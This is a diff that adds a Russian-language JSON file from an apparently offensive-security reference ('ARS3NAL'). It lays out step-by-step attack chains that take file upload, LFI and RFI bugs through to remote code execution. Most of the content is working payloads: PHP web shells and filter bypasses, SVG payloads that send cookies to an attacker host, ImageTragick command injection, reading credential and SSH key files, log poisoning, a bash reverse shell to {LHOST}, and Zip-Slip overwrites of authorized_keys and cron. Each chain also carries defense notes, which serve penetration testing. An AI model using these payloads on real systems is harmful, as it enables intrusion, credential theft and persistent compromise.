@@ -1,0 +1,514 @@
+{
+  "domain": "File Upload",
+  "domainLabel": "Загрузка файлов / LFI → RCE",
+  "domainOrder": 7,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "Загрузка файла до PHP веб-шелла",
+      "level": "newbie",
+      "impact": "Полный RCE от имени веб-пользователя (www-data); классический P1 в зависимости от scope.",
+      "why": "Самый надёжный путь от загрузки к шеллу; обход чёрного списка и проверки Content-Type должен быть доведён до автоматизма.",
+      "precondition": "Поле загрузки (аватар, вложение, импорт), сохраняющее файлы в доступный из веба каталог с исполнением PHP.",
+      "tags": [
+        "file-upload",
+        "webshell",
+        "rce",
+        "bypass"
+      ],
+      "realWorld": "PortSwigger Web Security Academy, лаборатории File upload vulnerabilities; OWASP Unrestricted File Upload.",
+      "defense": "Белый список расширений на сервере, перекодирование изображений, хранение загрузок вне webroot и отдача через неисполняющий обработчик.",
+      "steps": [
+        {
+          "title": "Найти загрузку и её каталог",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://target/FUZZ -mc 200,301,403"
+        },
+        {
+          "title": "Простой веб-шелл",
+          "kind": "note",
+          "detail": "shell.php = <?php system($_GET['cmd']); ?>"
+        },
+        {
+          "title": "Обход чёрного списка расширений",
+          "kind": "note",
+          "detail": "shell.phtml | shell.php5 | shell.php7 | shell.phar | shell.pht"
+        },
+        {
+          "title": "Двойное расширение и хвостовые символы",
+          "kind": "note",
+          "detail": "shell.php.jpg | shell.jpg.php | shell.php%00.jpg | shell.php. | shell.php::$DATA"
+        },
+        {
+          "title": "Подмена Content-Type",
+          "kind": "note",
+          "q": "",
+          "detail": "оставить имя .php, выставить у части с файлом Content-Type: image/jpeg в Burp"
+        },
+        {
+          "title": "Полиглот по magic-байтам",
+          "kind": "note",
+          "detail": "GIF89a;<?php system($_GET['cmd']); ?> сохранить как shell.php (обходит getimagesize())"
+        },
+        {
+          "title": "Подтвердить RCE и закрепиться",
+          "kind": "note",
+          "detail": "curl 'https://target/uploads/shell.php?cmd=id'; апгрейд: weevely generate S3cret agent.php",
+          "success": "uid=33(www-data) в ответе"
+        }
+      ]
+    },
+    {
+      "title": "Трюк с загрузкой .htaccess / web.config",
+      "level": "intermediate",
+      "impact": "RCE на сервере, принимающем только «картинки», за счёт переопределения того, какие расширения исполняются как код.",
+      "why": "Обходит строгий белый список расширений, когда сам конфиг-файл не в чёрном списке; запасной вариант, когда .phtml и аналоги не проходят.",
+      "precondition": "Загрузка попадает в каталог Apache с AllowOverride All (или IIS), а фильтр не блокирует .htaccess / web.config.",
+      "tags": [
+        "file-upload",
+        "htaccess",
+        "webconfig",
+        "rce"
+      ],
+      "realWorld": "HackTricks «File Upload - .htaccess / web.config»; периодические отчёты на HackerOne про загрузку аватаров.",
+      "defense": "Блокировать dotfiles и *.config при загрузке, отключить AllowOverride, держать загрузки вне путей, сопоставленных интерпретатору.",
+      "steps": [
+        {
+          "title": "Определить веб-сервер",
+          "kind": "note",
+          "detail": "curl -I https://target  ->  смотрим Server: (Apache / IIS / nginx)"
+        },
+        {
+          "title": "Apache: загрузить переопределение",
+          "kind": "note",
+          "detail": ".htaccess с содержимым: AddType application/x-httpd-php .l33t"
+        },
+        {
+          "title": "Загрузить шелл с новым расширением",
+          "kind": "note",
+          "detail": "avatar.l33t = <?php system($_GET['cmd']); ?>  (проходит белый список картинок)"
+        },
+        {
+          "title": "Вариант для IIS",
+          "kind": "note",
+          "detail": "web.config с блоком <handlers>/<staticContent>, либо классический ASP <%= Response.Write(...) %>"
+        },
+        {
+          "title": "Замечание про nginx",
+          "kind": "note",
+          "q": "",
+          "detail": "per-dir override нет; трюк не сработает, пивотим в traversal по имени сохранённого файла"
+        },
+        {
+          "title": "Триггер",
+          "kind": "note",
+          "detail": "curl 'https://target/uploads/avatar.l33t?cmd=id'",
+          "success": "uid=33(www-data)"
+        }
+      ]
+    },
+    {
+      "title": "Загрузка SVG / HTML до хранимой XSS и захвата аккаунта",
+      "level": "newbie",
+      "impact": "Хранимая XSS в браузере жертвы/админа, кража сессии или действие от имени админа ведёт к захвату.",
+      "why": "Когда исполнение кода недоступно, «картинки», отдаваемые inline как HTML/SVG, дают хранимую XSS в одном источнике.",
+      "precondition": "Приложение принимает SVG/HTML/XML и отдаёт их inline на своём источнике, а не как вложение для скачивания.",
+      "tags": [
+        "file-upload",
+        "svg",
+        "stored-xss",
+        "xxe"
+      ],
+      "realWorld": "Множество отчётов HackerOne про хранимую XSS через SVG; заметки PortSwigger про Content-Type и SVG.",
+      "defense": "Отдавать пользовательские файлы из песочного источника с Content-Disposition: attachment и CSP, либо санитизировать SVG (DOMPurify) и вырезать скрипты.",
+      "steps": [
+        {
+          "title": "Загрузить PoC SVG",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "xss.svg = <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
+          "success": "alert с доменом приложения"
+        },
+        {
+          "title": "SVG-кража cookie",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('https://{LHOST}/c?'+document.cookie)</script></svg>"
+        },
+        {
+          "title": "Вариант с HTML",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "poc.html с <script>document.location='https://{LHOST}/?'+document.cookie</script>"
+        },
+        {
+          "title": "Проверить inline-отдачу",
+          "kind": "note",
+          "q": "",
+          "detail": "открыть URL файла: Content-Type: image/svg+xml и НЕТ Content-Disposition: attachment"
+        },
+        {
+          "title": "Бонус: чтение файлов через SVG / XXE",
+          "kind": "payload",
+          "q": "XXE Injection",
+          "detail": "<image xlink:href=\"file:///etc/passwd\"/> либо XXE-сущность, если парсер на XML"
+        },
+        {
+          "title": "Вооружить атаку",
+          "kind": "note",
+          "q": "",
+          "detail": "отправить ссылку на файл админу, увести сессию или дёрнуть state-changing эндпоинт от его имени"
+        }
+      ]
+    },
+    {
+      "title": "Вредоносное изображение до RCE (ImageTragick / ImageMagick)",
+      "level": "intermediate",
+      "impact": "Серверный RCE в момент обработки/создания превью вашей «картинки».",
+      "why": "Любое приложение, прогоняющее загрузки через ImageMagick/GraphicsMagick, можно пробить без веб-шелла, часто вслепую через OOB.",
+      "precondition": "Загрузка передаётся в ImageMagick convert/identify (ресайз, превью, кроп аватара, PDF) на версии без ужесточённого policy.xml.",
+      "tags": [
+        "file-upload",
+        "imagemagick",
+        "imagetragick",
+        "rce",
+        "oob"
+      ],
+      "realWorld": "imagetragick.com (CVE-2016-3714); GhostScript CVE-2018-16509.",
+      "defense": "Обновить ImageMagick и закрыть /etc/ImageMagick*/policy.xml для кодеков MVG/MSL/URL/HTTPS/EPHEMERAL; проверять реальный тип изображения до обработки.",
+      "steps": [
+        {
+          "title": "Обнаружить обработку изображений",
+          "kind": "note",
+          "q": "",
+          "detail": "загрузить обычный JPG и заметить ресайз/перекодирование  ->  в пайплайне есть конвертер"
+        },
+        {
+          "title": "OOB-проба активности",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "exploit.mvg: push graphic-context / fill 'url(https://{LHOST}/ping.jpg)' / pop graphic-context",
+          "success": "входящий запрос на {LHOST}"
+        },
+        {
+          "title": "Инъекция команды (ImageTragick CVE-2016-3714)",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "fill 'url(https://127.0.0.1/x.jpg\"|curl https://{LHOST}/$(id|base64))' внутри MVG graphic-context"
+        },
+        {
+          "title": "Замаскировать под изображение",
+          "kind": "note",
+          "q": "",
+          "detail": "сохранить байты MVG как poc.png; ImageMagick выбирает кодек по содержимому, не по расширению"
+        },
+        {
+          "title": "Не-слепое подтверждение",
+          "kind": "payload",
+          "q": "Command Injection",
+          "detail": "...\"|id > /var/www/html/uploads/out.txt\" затем curl https://target/uploads/out.txt",
+          "success": "uid=... в out.txt"
+        },
+        {
+          "title": "Поворот через GhostScript",
+          "kind": "note",
+          "q": "",
+          "detail": "если принимается PDF/EPS, пробуем -dSAFER bypass (CVE-2018-16509) через crafted .eps"
+        }
+      ]
+    },
+    {
+      "title": "Path Traversal: чтение /etc/passwd, исходников и секретов",
+      "level": "newbie",
+      "impact": "Произвольное чтение файлов: исходники.env, креды БД, приватные ключи, облачные токены; часто прямой путь к полному захвату.",
+      "why": "Базовый примитив чтения, который превращает мелкий баг в полную компрометацию и составляет первую половину большинства цепочек LFI -> RCE.",
+      "precondition": "Параметр, называющий файл: ?file= ?page= ?download= ?template= ?lang=, прокси картинок/вложений.",
+      "tags": [
+        "path-traversal",
+        "lfi",
+        "file-read",
+        "secrets"
+      ],
+      "realWorld": "Общая техника; OWASP Path Traversal; повсеместные находки ?file= при разведке.",
+      "defense": "Канонизировать через realpath, проверять префикс базового каталога, отклонять ../ и нулевые байты.",
+      "steps": [
+        {
+          "title": "Найти файловые параметры",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://target/index.php?FUZZ=../../../../etc/passwd' -mr 'root:x:0:0'"
+        },
+        {
+          "title": "Классический обход каталога",
+          "kind": "payload",
+          "q": "Directory Traversal",
+          "detail": "?file=../../../../../../etc/passwd",
+          "success": "root:x:0:0: в ответе"
+        },
+        {
+          "title": "Обход через кодирование",
+          "kind": "payload",
+          "q": "Directory Traversal",
+          "detail": "%2e%2e%2f | double-encode %252e%252e%252f | overlong ..%c0%af"
+        },
+        {
+          "title": "Обход вырезания (filter-strip)",
+          "kind": "payload",
+          "q": "Directory Traversal",
+          "detail": "....//....//....//etc/passwd  (обходит наивную замену ../ -> '')"
+        },
+        {
+          "title": "Нулевой байт (старый PHP < 5.3.4)",
+          "kind": "payload",
+          "q": "Directory Traversal",
+          "detail": "?file=../../../../etc/passwd%00.png"
+        },
+        {
+          "title": "Чтение исходника через php-фильтр",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "php://filter/convert.base64-encode/resource=index.php  затем base64 -d"
+        },
+        {
+          "title": "Забрать настоящую добычу",
+          "kind": "checklist",
+          "q": "file-inclusion",
+          "detail": "/var/www/html/.env  config.php  /proc/self/cmdline  ~/.aws/credentials  ~/.ssh/id_rsa  /etc/nginx/sites-enabled/*"
+        }
+      ]
+    },
+    {
+      "title": "LFI до RCE через отравление читаемого файла",
+      "level": "intermediate",
+      "impact": "Превращает read-only LFI в полный RCE от www-data.",
+      "why": "Классическая эскалация LFI без доступной загрузки: внедрить PHP в файл, который и так читаешь, затем подключить его.",
+      "precondition": "Подтверждённая LFI, где подключаемые файлы исполняются, плюс читаемый управляемый атакующим файл (лог, /proc или сессия PHP).",
+      "tags": [
+        "lfi",
+        "log-poisoning",
+        "proc-environ",
+        "php-session",
+        "rce"
+      ],
+      "realWorld": "HTB Poison / Beep; OWASP «LFI + log poisoning».",
+      "defense": "Никогда не include() с пользовательским путём, задать open_basedir, держать логи и сессии вне зоны подключения.",
+      "steps": [
+        {
+          "title": "Убедиться, что include исполняет код",
+          "kind": "note",
+          "q": "",
+          "detail": "?page=../../../../etc/passwd работает И .php-файлы исполняются, а не печатаются"
+        },
+        {
+          "title": "Найти отравляемые логи",
+          "kind": "checklist",
+          "q": "file-inclusion",
+          "detail": "/var/log/apache2/access.log  /var/log/nginx/access.log  /var/log/apache2/error.log"
+        },
+        {
+          "title": "Отравить и подключить access.log",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "заголовок User-Agent: <?php system($_GET['cmd']); ?>  затем  ?page=../../../../var/log/apache2/access.log&cmd=id",
+          "success": "uid=... в ответе"
+        },
+        {
+          "title": "Вариант /proc/self/environ",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "отравить User-Agent, затем ?page=../../../../proc/self/environ&cmd=id"
+        },
+        {
+          "title": "Вариант с файлом сессии PHP",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "записать <?php system($_GET['cmd']); ?> в поле сессии, затем ?page=../../../../var/lib/php/sessions/sess_<PHPSESSID>&cmd=id"
+        },
+        {
+          "title": "Вариант SSH auth.log",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "ssh '<?php system($_GET[cmd]);?>'@target  затем include /var/log/auth.log"
+        },
+        {
+          "title": "Подтвердить и поднять reverse shell",
+          "kind": "revshell",
+          "q": "",
+          "detail": "bash -c 'bash -i >& /dev/tcp/{LHOST}/4444 0>&1'"
+        }
+      ]
+    },
+    {
+      "title": "LFI до RCE через PHP-обёртки (filter chain, data://, input, expect)",
+      "level": "intermediate",
+      "impact": "Полный RCE из чистого чтения файла LFI без загрузки и без записываемого лога.",
+      "why": "Современный почти универсальный LFI -> RCE против include/require/file_get_contents, когда отравление и загрузка невозможны.",
+      "precondition": "Sink LFI достижим через PHP stream wrappers (значение идёт в функцию чтения файла PHP).",
+      "tags": [
+        "lfi",
+        "php-wrappers",
+        "filter-chain",
+        "data-wrapper",
+        "rce"
+      ],
+      "realWorld": "Synacktiv «PHP filter chains: file read to RCE»; HTB UpDown.",
+      "defense": "Отключить allow_url_include, белый список целей include, ограничить PHP через disable_functions и open_basedir.",
+      "steps": [
+        {
+          "title": "Проверить доступность php://",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?file=php://filter/read=convert.base64-encode/resource=index.php  возвращает base64",
+          "success": "base64-блоб вместо рендера"
+        },
+        {
+          "title": "Сгенерировать filter chain",
+          "kind": "script",
+          "q": "php_filter_chain LFI→RCE (ссылка на synacktiv, без upload)",
+          "detail": "python3 php_filter_chain_generator.py --chain '<?php system($_GET[\"cmd\"]); ?>'"
+        },
+        {
+          "title": "Запустить цепочку (файл не нужен)",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "вставить длинный php://filter/convert.iconv.../resource=php://temp в ?file= и добавить &cmd=id"
+        },
+        {
+          "title": "Вариант data://",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id  (нужно allow_url_include=On)"
+        },
+        {
+          "title": "Вариант php://input",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?file=php://input  с телом POST <?php system($_GET['cmd']); ?>  (нужно allow_url_include=On)"
+        },
+        {
+          "title": "Вариант expect://",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?file=expect://id  (только если загружено расширение expect)"
+        },
+        {
+          "title": "Подтвердить",
+          "kind": "note",
+          "detail": "curl '...&cmd=id'",
+          "success": "uid=33(www-data)"
+        }
+      ]
+    },
+    {
+      "title": "Remote File Inclusion до удалённого веб-шелла",
+      "level": "newbie",
+      "impact": "Мгновенный RCE подключением кода с вашего сервера (реже на современных стеках).",
+      "why": "Хрестоматийный баг подключения и наглядная демонстрация, почему allow_url_include опасен.",
+      "precondition": "Sink подключения плюс allow_url_include=On и allow_url_fopen=On (типично для легаси PHP / неверной настройки).",
+      "tags": [
+        "rfi",
+        "remote-inclusion",
+        "webshell",
+        "rce"
+      ],
+      "realWorld": "Общая техника; OWASP RFI; старые advisory плагинов WordPress/Joomla.",
+      "defense": "Держать allow_url_include=Off (по умолчанию с PHP 5.2), не строить пути include из пользовательского ввода.",
+      "steps": [
+        {
+          "title": "Захостить полезную нагрузку",
+          "kind": "note",
+          "detail": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.txt && python3 -m http.server 8000"
+        },
+        {
+          "title": "Подключить удалённо",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?page=http://{LHOST}:8000/shell.txt&cmd=id",
+          "success": "uid=... в ответе"
+        },
+        {
+          "title": "Обойти дописанное расширение",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?page=http://{LHOST}:8000/shell.txt%00  или  ?page=http://{LHOST}:8000/shell.txt?  (отсекает принудительный .php)"
+        },
+        {
+          "title": "Запасные FTP / SMB",
+          "kind": "payload",
+          "q": "File Inclusion",
+          "detail": "?page=ftp://{LHOST}/shell.txt  или  \\\\{LHOST}\\share\\shell.txt на Windows"
+        },
+        {
+          "title": "Подтвердить",
+          "kind": "note",
+          "detail": "curl 'https://target/index.php?page=http://{LHOST}:8000/shell.txt&cmd=id'"
+        },
+        {
+          "title": "Закрепиться",
+          "kind": "note",
+          "detail": "подключить weevely agent.php удалённо либо system('curl -o /var/www/html/uploads/s.php https://{LHOST}/s.php')"
+        }
+      ]
+    },
+    {
+      "title": "Zip-Slip / симлинк / обход при распаковке архива",
+      "level": "intermediate",
+      "impact": "Запись веб-шелла в webroot (или перезапись cron/authorized_keys) и чтение произвольных файлов через симлинки.",
+      "why": "Везде, где приложение распаковывает загруженный архив (импорт, плагин/тема, восстановление бэкапа), хитрое имя записи выходит за пределы каталога.",
+      "precondition": "Эндпоинт, распаковывающий загруженный .zip/.tar без санитизации имён записей.",
+      "tags": [
+        "zip-slip",
+        "symlink",
+        "archive",
+        "path-traversal",
+        "rce"
+      ],
+      "realWorld": "Исследование Snyk «Zip Slip» (2018), затронуло множество библиотек архивов и CVE.",
+      "defense": "Отклонять имена записей с .. или абсолютными путями, канонизировать каждый путь назначения и проверять, что он внутри целевого каталога, запретить распаковку симлинков.",
+      "steps": [
+        {
+          "title": "Найти эндпоинт распаковки",
+          "kind": "note",
+          "q": "",
+          "detail": "import / restore-backup / install-plugin / 'upload archive'"
+        },
+        {
+          "title": "Собрать zip-slip архив",
+          "kind": "note",
+          "detail": "python evilarc.py shell.php -o unix -d 8 -p var/www/html/uploads/"
+        },
+        {
+          "title": "Ручной вариант записи",
+          "kind": "payload",
+          "q": "Zip Slip",
+          "detail": "python3 zipfile: запись с именем ../../../../var/www/html/uploads/shell.php"
+        },
+        {
+          "title": "Загрузить и распаковать",
+          "kind": "note",
+          "q": "",
+          "detail": "отправить evil.zip в эндпоинт импорта и дать серверу распаковать"
+        },
+        {
+          "title": "Подтвердить RCE",
+          "kind": "note",
+          "detail": "curl 'https://target/uploads/shell.php?cmd=id'",
+          "success": "uid=33(www-data)"
+        },
+        {
+          "title": "Вариант чтения через симлинк",
+          "kind": "payload",
+          "q": "Zip Slip",
+          "detail": "ln -s /etc/passwd link; tar -cvf evil.tar link  (или zip --symlinks)  затем прочитать распакованный link"
+        },
+        {
+          "title": "Повороты через перезапись",
+          "kind": "checklist",
+          "q": "zip-slip",
+          "detail": "цель ../../../../home/user/.ssh/authorized_keys  или  /etc/cron.d/x для исполнения кода"
+        }
+      ]
+    }
+  ]
+}
